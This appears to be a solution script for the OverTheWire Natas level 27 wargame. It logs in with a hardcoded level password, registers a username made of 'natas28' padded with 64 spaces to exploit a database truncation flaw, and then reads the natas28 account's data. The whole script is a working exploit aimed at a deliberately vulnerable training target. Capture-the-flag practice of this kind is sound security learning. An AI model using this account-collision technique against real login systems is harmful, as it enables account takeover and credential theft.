#!/usr/bin/python3
import requests

level = 'natas27'
url = 'http://{}.natas.labs.overthewire.org/'.format(level)


auth = (level, 'u3RRffXjysjgwFU6b9xa23i6prmUsYne')

session = requests.Session()

session.post(
    url,
    data={'username': 'natas28' + ' ' * 64 + 'doesnotmatter', 'password': 'something'},
    auth=auth
)

response = session.post(
    url,
    data={'username': 'natas28', 'password': 'something'},
    auth=auth
)

print(response.text)
